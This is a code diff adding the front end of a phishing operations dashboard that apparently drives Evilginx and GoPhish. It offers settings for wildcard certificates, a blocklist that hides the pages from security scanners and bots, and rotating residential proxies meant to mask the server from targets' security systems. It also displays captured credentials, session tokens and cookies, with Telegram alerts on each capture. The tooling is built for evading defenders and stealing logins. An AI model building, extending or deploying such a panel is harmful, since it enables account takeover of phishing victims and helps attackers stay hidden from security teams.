+                        <p class="text-sm text-gray-400">Use Cloudflare API for DNS-01 challenge to obtain wildcard SSL certificates (*.yourdomain.com).</p>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Cloudflare API Token</label>
+                            <input type="password" x-model="settings.cloudflare_api_token" placeholder="Your Cloudflare API token..." class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                            <p class="text-xs text-gray-500 mt-1">Create a token with Zone:DNS:Edit permissions at <a href="https://dash.cloudflare.com/profile/api-tokens" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline">Cloudflare API Tokens</a></p>
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" x-model="settings.cloudflare_wildcard_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-orange-500 focus:ring-orange-500">
+                                <span class="text-sm text-gray-400">Enable Wildcard Certificates</span>
+                            </label>
+                            <div class="flex gap-2">
+                                <button type="button" @click="syncCloudflareToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Evilginx">
+                                    Push to Evilginx
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blocklist / Request Checker Config -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white">🛡️ Blocklist / Request Checker</h3>
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Evilginx Sync:</span>
+                            <span x-show="blocklistSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="blocklistSyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="blocklistSyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="blocklistSyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="blocklistSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Evilginx Offline
+                            </span>
+                            <button type="button" @click="syncBlocklistFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Evilginx">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <p class="text-sm text-gray-400">Block requests from known security scanners, bots, and suspicious IPs/ASNs.</p>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <label class="flex items-center gap-3 p-3 bg-gray-900 rounded border border-gray-700 cursor-pointer hover:border-gray-600">
+                                <input type="checkbox" x-model="settings.blocklist_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-red-500 focus:ring-red-500">
+                                <div>
+                                    <div class="text-sm text-white font-medium">Enable Blocklist</div>
+                                    <div class="text-xs text-gray-500">Block suspicious requests</div>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-3 p-3 bg-gray-900 rounded border border-gray-700 cursor-pointer hover:border-gray-600">
+                                <input type="checkbox" x-model="settings.blocklist_verbose" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-yellow-500 focus:ring-yellow-500">
+                                <div>
+                                    <div class="text-sm text-white font-medium">Verbose Logging</div>
+                                    <div class="text-xs text-gray-500">Log blocked requests</div>
+                                </div>
+                            </label>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">ASN Blocklist File</label>
+                                <input type="text" x-model="settings.blocklist_asn_file" placeholder="blocklists/asn_list.txt" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm focus:border-blue-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">User-Agent Blocklist File</label>
+                                <input type="text" x-model="settings.blocklist_useragent_file" placeholder="blocklists/useragent_list.txt" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm focus:border-blue-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">IP Range Blocklist File</label>
+                                <input type="text" x-model="settings.blocklist_ip_range_file" placeholder="blocklists/ip_range_list.txt" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm focus:border-blue-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-1">IP List Blocklist File</label>
+                                <input type="text" x-model="settings.blocklist_ip_list_file" placeholder="blocklists/ip_list.txt" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm focus:border-blue-500 focus:outline-none">
+                            </div>
+                        </div>
+                        <div class="flex justify-end gap-2">
+                            <button type="button" @click="syncBlocklistToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Evilginx">
+                                Push to Evilginx
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Paths & Runtime -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                        <h3 class="text-lg font-medium text-white mb-2">GoPhish DB Path</h3>
+                        <p class="text-xs text-gray-500 mb-2">Defaults to the project gophish.db. Contact administrator to change.</p>
+                        <input type="text" x-model="settings.gophish_db_path" placeholder="/path/to/gophish.db" disabled class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-gray-400 cursor-not-allowed">
+                    </div>
+                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                        <h3 class="text-lg font-medium text-white mb-2">Whitelist Path</h3>
+                        <p class="text-xs text-gray-500 mb-2">Defaults to ../evilginx3/Custom/whitelist.txt. Contact administrator to change.</p>
+                        <input type="text" x-model="settings.whitelist_path" placeholder="/path/to/whitelist.txt" disabled class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-gray-400 cursor-not-allowed">
+                    </div>
+                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6 md:col-span-2">
+                        <h3 class="text-lg font-medium text-white mb-2">Listen Address</h3>
+                        <p class="text-xs text-gray-500 mb-2">Defaults to :1337. Contact administrator to change (restart required).</p>
+                        <input type="text" x-model="settings.listen_addr" placeholder=":1337 or 127.0.0.1:1337" disabled class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-gray-400 cursor-not-allowed">
+                    </div>
+                </div>
+
+                <!-- Whitelist -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <h3 class="text-lg font-medium text-white mb-4">IP Whitelist</h3>
+                    <div class="flex gap-2 mb-4">
+                        <input type="text" x-model="newWhitelistIP" placeholder="Enter IP address" class="flex-1 bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        <button type="button" @click="addWhitelist()" title="Add IP to whitelist" class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded">Add</button>
+                    </div>
+                    <div class="bg-gray-900 rounded border border-gray-600 p-2 max-h-40 overflow-y-auto">
+                        <template x-for="ip in whitelist" :key="ip">
+                            <div class="flex justify-between items-center p-2 hover:bg-gray-800 rounded">
+                                <span class="font-mono text-sm text-gray-300" x-text="ip"></span>
+                                <button type="button" @click="removeWhitelist(ip)" title="Remove IP from whitelist" class="text-red-400 hover:text-red-300 text-xs">Remove</button>
+                            </div>
+                        </template>
+                        <div x-show="whitelist.length === 0" class="text-sm text-gray-500 p-2">No whitelisted IPs</div>
+                    </div>
+                    <div class="flex justify-end mt-3">
+                        <button type="button" @click="clearWhitelist()" title="Clear all whitelisted IPs" class="text-xs text-gray-400 hover:text-gray-200">Clear All</button>
+                    </div>
+                </div>
+
+                <!-- GoPhish Defaults -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <h3 class="text-lg font-medium text-white mb-2">GoPhish Default Credentials</h3>
+                    <p class="text-sm text-gray-400 mb-4">These are the default credentials generated on first launch.</p>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="bg-black/30 p-3 rounded">
+                            <div class="text-xs text-gray-500 uppercase">Username</div>
+                            <div class="font-mono text-white">admin</div>
+                        </div>
+                        <div class="bg-black/30 p-3 rounded">
+                            <div class="text-xs text-gray-500 uppercase">Password</div>
+                            <div class="font-mono text-white">See gophish.log</div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Proxy View -->
+        <div x-show="tab === 'proxy'" x-cloak>
+            <div class="space-y-6 max-w-4xl">
+                <!-- Proxy Header -->
+                <div class="bg-gradient-to-r from-blue-900/30 to-purple-900/30 rounded-lg border border-blue-800/50 p-6">
+                    <div class="flex items-center gap-3 mb-2">
+                        <svg class="h-8 w-8 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
+                        <h2 class="text-2xl font-bold text-white">Proxy Configuration</h2>
+                    </div>
+                    <p class="text-gray-400">Route outbound traffic to target sites through a proxy server. Masks your server's IP from the target.</p>
+                </div>
+
+                <!-- Status Banner -->
+                <div :class="settings.proxy_enabled ? 'bg-green-900/20 border-green-700' : 'bg-yellow-900/20 border-yellow-700'" class="rounded-lg border p-4 flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <div :class="settings.proxy_enabled ? 'bg-green-500' : 'bg-yellow-500'" class="w-3 h-3 rounded-full animate-pulse"></div>
+                        <div>
+                            <div :class="settings.proxy_enabled ? 'text-green-400' : 'text-yellow-400'" class="font-medium" x-text="settings.proxy_enabled ? 'Proxy Active' : 'Proxy Inactive'"></div>
+                            <div class="text-xs text-gray-500" x-text="settings.proxy_enabled ? (settings.proxy_type.toUpperCase() + ' → ' + settings.proxy_address + ':' + settings.proxy_port) : 'Traffic is going directly to targets'"></div>
+                        </div>
+                    </div>
+                    <label class="relative inline-flex items-center cursor-pointer">
+                        <input type="checkbox" x-model="settings.proxy_enabled" class="sr-only peer">
+                        <div class="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
+                    </label>
+                </div>
+
+                <!-- Proxy Settings Card -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <h3 class="text-lg font-medium text-white mb-4 flex items-center gap-2">
+                        <svg class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
+                        Connection Settings
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Proxy Type</label>
+                            <select x-model="settings.proxy_type" title="Select proxy type" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                                <option value="http">HTTP</option>
+                                <option value="https">HTTPS</option>
+                                <option value="socks5">SOCKS5</option>
+                                <option value="socks5h">SOCKS5H (DNS via proxy)</option>
+                            </select>
+                            <p class="text-xs text-gray-500 mt-1">SOCKS5H routes DNS lookups through the proxy too</p>
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Address</label>
+                            <input type="text" x-model="settings.proxy_address" placeholder="127.0.0.1 or proxy.example.com" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Port</label>
+                            <input type="number" x-model.number="settings.proxy_port" placeholder="1080" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Username <span class="text-gray-600">(optional)</span></label>
+                            <input type="text" x-model="settings.proxy_username" placeholder="username" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div class="md:col-span-2">
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Password <span class="text-gray-600">(optional)</span></label>
+                            <input type="password" x-model="settings.proxy_password" placeholder="••••••••" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                    </div>
+                    <div class="mt-6 flex justify-end">
+                        <button type="button" @click="saveProxySettings" title="Apply proxy settings" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
+                            <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>
+                            Apply Changes
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Info Card -->
+                <div class="bg-gray-800/50 rounded-lg border border-gray-700 p-4">
+                    <h4 class="text-sm font-medium text-gray-300 mb-2">How it works</h4>
+                    <div class="text-xs text-gray-500 space-y-1">
+                        <p>• The proxy routes traffic between Evilginx and the target site (e.g., Google, Microsoft)</p>
+                        <p>• This masks your server's IP address from the target's security systems</p>
+                        <p>• Changes apply <span class="text-green-400 font-medium">immediately</span> - no restart required!</p>
+                        <p>• Use residential or mobile proxies for best results</p>
+                    </div>
+                </div>
+
+                <!-- Proxy Pool Section -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6 mt-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white flex items-center gap-2">
+                            <svg class="h-5 w-5 text-purple-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
+                            Proxy Pool (Bulk Import)
+                        </h3>
+                        <div class="flex items-center gap-2">
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" x-model="proxyPool.enabled" @change="toggleProxyPool()" class="sr-only peer">
+                                <div class="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-purple-600"></div>
+                            </label>
+                            <span class="text-xs text-gray-400">Pool Active</span>
+                        </div>
+                    </div>
+
+                    <!-- Pool Stats -->
+                    <div class="grid grid-cols-4 gap-3 mb-4">
+                        <div class="bg-gray-900 rounded p-3 text-center">
+                            <div class="text-2xl font-bold text-white" x-text="proxyPool.stats.total || 0"></div>
+                            <div class="text-xs text-gray-500">Total</div>
+                        </div>
+                        <div class="bg-gray-900 rounded p-3 text-center">
+                            <div class="text-2xl font-bold text-green-400" x-text="proxyPool.stats.working || 0"></div>
+                            <div class="text-xs text-gray-500">Working</div>
+                        </div>
+                        <div class="bg-gray-900 rounded p-3 text-center">
+                            <div class="text-2xl font-bold text-red-400" x-text="proxyPool.stats.failed || 0"></div>
+                            <div class="text-xs text-gray-500">Failed</div>
+                        </div>
+                        <div class="bg-gray-900 rounded p-3 text-center">
+                            <div class="text-2xl font-bold text-yellow-400" x-text="proxyPool.stats.untested || 0"></div>
+                            <div class="text-xs text-gray-500">Untested</div>
+                        </div>
+                    </div>
+
+                    <!-- Rotation Mode -->
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-400 mb-1">Rotation Mode</label>
+                        <select x-model="proxyPool.rotationMode" @change="updateProxyPoolSettings()" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-purple-500 focus:outline-none">
+                            <option value="round_robin">Round Robin (cycle through all)</option>
+                            <option value="random">Random (pick randomly)</option>
+                            <option value="least_used">Least Used (balance load)</option>
+                            <option value="fastest">Fastest (lowest latency)</option>
+                        </select>
+                    </div>
+
+                    <!-- Bulk Import -->
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-400 mb-1">Bulk Import Proxies</label>
+                        <textarea x-model="proxyPool.importText" placeholder="Paste proxies (one per line)&#10;Format: type://user:pass@host:port&#10;Examples:&#10;socks5://user:pass@1.2.3.4:1080&#10;http://proxy.example.com:8080&#10;socks5h://1.2.3.4:1080" rows="5" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white text-sm font-mono focus:border-purple-500 focus:outline-none"></textarea>
+                        <div class="flex gap-2 mt-2">
+                            <button type="button" @click="importProxies()" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
+                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" /></svg>
+                                Import
+                            </button>
+                            <button type="button" @click="validateAllProxies()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
+                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                                Validate All
+                            </button>
+                            <button type="button" @click="clearProxyPool()" class="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors flex items-center gap-2">
+                                <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                                Clear All
+                            </button>
+                        </div>
+                        <div x-show="proxyPool.importResult" class="mt-2 text-sm" :class="proxyPool.importResult.error ? 'text-red-400' : 'text-green-400'" x-text="proxyPool.importResult.message"></div>
+                    </div>
+
+                    <!-- Proxy List -->
+                    <div class="border border-gray-700 rounded overflow-hidden">
+                        <div class="bg-gray-900 px-3 py-2 text-xs text-gray-400 font-medium flex">
+                            <div class="w-1/4">Proxy</div>
+                            <div class="w-1/6">Type</div>
+                            <div class="w-1/6">Status</div>
+                            <div class="w-1/6">Latency</div>
+                            <div class="w-1/6">Uses</div>
+                            <div class="w-1/12 text-right">Actions</div>
+                        </div>
+                        <div class="max-h-64 overflow-y-auto">
+                            <template x-for="proxy in proxyPool.proxies" :key="proxy.id">
+                                <div class="px-3 py-2 border-t border-gray-800 flex items-center text-sm hover:bg-gray-800/50">
+                                    <div class="w-1/4 font-mono text-xs text-gray-300 truncate" x-text="proxy.address + ':' + proxy.port"></div>
+                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.type.toUpperCase()"></div>
+                                    <div class="w-1/6">
+                                        <span x-show="proxy.status === 'working'" class="text-xs text-green-400">● Working</span>
+                                        <span x-show="proxy.status === 'failed'" class="text-xs text-red-400">● Failed</span>
+                                        <span x-show="proxy.status === 'untested'" class="text-xs text-yellow-400">● Untested</span>
+                                        <span x-show="proxy.status === 'testing'" class="text-xs text-blue-400">● Testing...</span>
+                                    </div>
+                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.latency ? proxy.latency + 'ms' : '-'"></div>
+                                    <div class="w-1/6 text-xs text-gray-400" x-text="proxy.use_count || 0"></div>
+                                    <div class="w-1/12 text-right">
+                                        <button type="button" @click="removeProxy(proxy.id)" title="Remove proxy" class="text-red-400 hover:text-red-300">
+                                            <svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
+                                        </button>
+                                    </div>
+                                </div>
+                            </template>
+                            <div x-show="proxyPool.proxies.length === 0" class="px-3 py-8 text-center text-gray-500 text-sm">
+                                No proxies in pool. Import some above.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Campaign Drill Modal -->
+        <div x-show="showCampaignModal" x-cloak class="fixed inset-0 bg-black/60 z-40 flex items-center justify-center">
+            <div class="bg-gray-900 border border-gray-700 rounded-lg shadow-2xl w-full max-w-3xl mx-4 overflow-hidden">
+                <div class="p-4 border-b border-gray-800 flex justify-between items-center">
+                    <div>
+                        <h3 class="text-lg text-white font-semibold" x-text="activeCampaign ? activeCampaign.name : 'Campaign'"></h3>
+                        <p class="text-xs text-gray-500" x-text="activeCampaign ? ('ID ' + activeCampaign.id + ' • ' + activeCampaign.status) : ''"></p>
+                    </div>
+                    <button type="button" @click="closeCampaignModal()" title="Close campaign modal" class="text-sm text-gray-400 hover:text-gray-200">Close</button>
+                </div>
+                <div class="p-4 grid grid-cols-1 md:grid-cols-4 gap-4">
+                    <template x-for="item in ['open','click','credentials','session']" :key="item">
+                        <div class="glass-stat p-3 rounded">
+                            <div class="text-[11px] text-gray-400 uppercase mb-1" x-text="item"></div>
+                            <div class="text-2xl font-bold text-white" x-text="campaignStats && campaignStats.counts ? campaignStats.counts[item] || 0 : '...'"></div>
+                            <div class="mt-1 h-1.5 bg-gray-800 rounded">
+                                <div class="h-1.5 bg-blue-500 rounded" :style="`width:${campaignStatPct(item)}%`"></div>
+                            </div>
+                        </div>
+                    </template>
+                </div>
+                <div class="p-4 border-t border-gray-800">
+                    <div class="text-xs text-gray-400 mb-2">Other</div>
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-sm text-gray-300">
+                        <div>Sent: <span class="font-mono" x-text="campaignStats && campaignStats.counts ? campaignStats.counts.sent : '...'"></span></div>
+                        <div>Reported: <span class="font-mono" x-text="campaignStats && campaignStats.counts ? campaignStats.counts.reported : '...'"></span></div>
+                        <div>Other: <span class="font-mono" x-text="campaignStats && campaignStats.counts ? campaignStats.counts.other : '...'"></span></div>
+                        <div>Created: <span class="font-mono" x-text="campaignStats && campaignStats.created ? campaignStats.created : (activeCampaign ? activeCampaign.created_date : '')"></span></div>
+                    </div>
+                    <div class="mt-3 text-xs text-gray-500" x-show="!campaignStats">Loading campaign details...</div>
+                </div>
+            </div>
+        </div>
+
+      </main>
+    </div>
+  </div>
+
+  <audio id="alert" src="notify.mp3"></audio>
+
+  <!-- Toast Container -->
+  <div id="toast-container" class="toast-container"></div>
+
+  <script>
+    // Global toast function - replaces alert()
+    function showToast(message, type = 'info', duration = 3000) {
+        const container = document.getElementById('toast-container');
+        const toast = document.createElement('div');
+        toast.className = `toast ${type}`;
+        
+        // Add icon based on type
+        const icons = {
+            success: '✓',
+            error: '✕',
+            warning: '⚠',
+            info: 'ℹ'
+        };
+        const icon = icons[type] || icons.info;
+        
+        toast.innerHTML = `<span style="margin-right: 8px;">${icon}</span>${message}`;
+        container.appendChild(toast);
+        
+        // Auto-remove after duration
+        setTimeout(() => {
+            toast.classList.add('hiding');
+            setTimeout(() => toast.remove(), 300);
+        }, duration);
+        
+        // Click to dismiss
+        toast.addEventListener('click', () => {
+            toast.classList.add('hiding');
+            setTimeout(() => toast.remove(), 300);
+        });
+    }
+
+    function nexusfeed() {
+      return {
+        tab: 'dashboard',
+        sidebarOpen: false,
+        events: [],
+        visitorData: [],
+        credentialData: [],
+        campaignData: [],
+        whitelist: [],
+        settings: { 
+            lure_url: 'Waiting for update...', 
+            telegram_bot_token: '', telegram_chat_id: '', telegram_enabled: false, 
+            turnstile_sitekey: '', turnstile_secretkey: '', turnstile_enabled: false, 
+            proxy_type: 'socks5', proxy_address: '', proxy_port: 0, proxy_username: '', proxy_password: '', proxy_enabled: false, 
+            gophish_db_path: '', whitelist_path: '', listen_addr: '',
+            // Anonymity settings
+            anonymity_enabled: false, anonymity_header_randomization: false, anonymity_useragent_rotation: false,
+            // Cloudflare DNS settings
+            cloudflare_api_token: '', cloudflare_wildcard_enabled: false,
+            // Blocklist settings
+            blocklist_enabled: false, blocklist_verbose: false, blocklist_asn_file: 'blocklists/asn_list.txt', blocklist_useragent_file: 'blocklists/useragent_list.txt', blocklist_ip_range_file: 'blocklists/ip_range_list.txt', blocklist_ip_list_file: 'blocklists/ip_list.txt'
+        },
+        newWhitelistIP: '',
+        stats: {sessions:0, creds:0, real:0, bots:0, total:0},
+        uniqueIPs: new Set(),
+        map: null,
+        connected: false,
+        muted: true,
+        showNotifications: false,
+        notifications: [],
+        selectedEvent: null,
+        filterType: 'all',
+        filterPhishlet: '',
+        filterSearch: '',
+        filterTime: 'all',
+        cluster: null,
+        heatLayer: null,
+        heatmapEnabled: false,
+        logEvents: [],
+        savedFilters: [],
+        tokenView: { label: 'Select a record to view tokens', cookies: [], pairs: [], raw: '' },
+        showCampaignModal: false,
+        activeCampaign: null,
+        campaignStats: null,
+        eventCols: { event: true, target: true, location: true, time: true },
+        notifyPrefs: { session: true, credentials: true, bot: false, click: false, open: false },
+        dndUntil: 0,
+        turnstileSyncStatus: 'synced',
+        turnstileSyncError: '',
+        turnstileSyncInterval: null,
+        telegramSyncStatus: 'synced',
+        telegramSyncError: '',
+        anonymitySyncStatus: 'synced',
+        anonymitySyncError: '',
+        cloudflareSyncStatus: 'synced',
+        cloudflareSyncError: '',
+        blocklistSyncStatus: 'synced',
+        blocklistSyncError: '',
+        seenIPs: new Set(),
+        // Proxy Pool state
+        proxyPool: {
+            enabled: false,
+            rotationMode: 'round_robin',
+            proxies: [],
+            stats: { total: 0, working: 0, failed: 0, untested: 0 },
+            importText: '',
+            importResult: null
+        },
+
+        init() {
+          // Load notification preferences from localStorage
+          const savedNotifyPrefs = localStorage.getItem('notifyPrefs');
+          if (savedNotifyPrefs) {
+            try {
+              this.notifyPrefs = JSON.parse(savedNotifyPrefs);
+            } catch (e) {
+              console.warn('Failed to parse saved notification preferences');
+            }
+          }
+
+          // Watch for notification preference changes and persist
+          this.$watch('notifyPrefs', (val) => {
+            localStorage.setItem('notifyPrefs', JSON.stringify(val));
+          });
+
+          // Load seen IPs from localStorage for deduplication
+          const savedSeenIPs = localStorage.getItem('seenIPs');
+          if (savedSeenIPs) {
+            try {
+              this.seenIPs = new Set(JSON.parse(savedSeenIPs));
+            } catch (e) {
+              console.warn('Failed to parse saved seenIPs');
+            }
+          }
+
+          this.connectWS();
+          this.initMap();
+          this.loadSettings();
+          this.loadWhitelist();
+          this.loadEvents();
+          this.applyFiltersFromURL();
+          this.loadSavedFilters();
+
+          // Start Turnstile sync polling every 30 seconds
+          this.syncTurnstileFromEvilginx();
+          this.turnstileSyncInterval = setInterval(() => {
+            if (document.visibilityState === 'visible') {
+              this.syncTurnstileFromEvilginx();
+            }
+          }, 30000);
+
+          // Start Telegram sync polling every 30 seconds
+          this.syncTelegramFromEvilginx();
+          setInterval(() => {
+            if (document.visibilityState === 'visible') {
+              this.syncTelegramFromEvilginx();
+            }
+          }, 30000);
+        },
+        
+        toggleMute() { this.muted = !this.muted; },
+        setDnd(minutes) {
+          if (minutes === 0) { this.dndUntil = 0; return; }
+          this.dndUntil = Date.now() + minutes * 60 * 1000;
+        },
+        toggleNotifications() { this.showNotifications = !this.showNotifications; },
+        clearNotifications() { this.notifications = []; },
+        filteredEvents() {
+          const now = Date.now();
+          const filtered = this.events.filter(e => {
+            if (this.filterType !== 'all' && e.type !== this.filterType) return false;
+            if (this.filterPhishlet && e.phishlet !== this.filterPhishlet) return false;
+            if (this.filterTime === '1h' && e.timestamp && now - e.timestamp > 3600_000) return false;
+            if (this.filterTime === '24h' && e.timestamp && now - e.timestamp > 86_400_000) return false;
+            if (this.filterSearch) {
+              const q = this.filterSearch.toLowerCase();
+              const hay = `${e.username || ''} ${e.ip || ''} ${e.session_id || ''}`.toLowerCase();
+              if (!hay.includes(q)) return false;
+            }
+            return true;
+          });
+          return filtered;
+        },
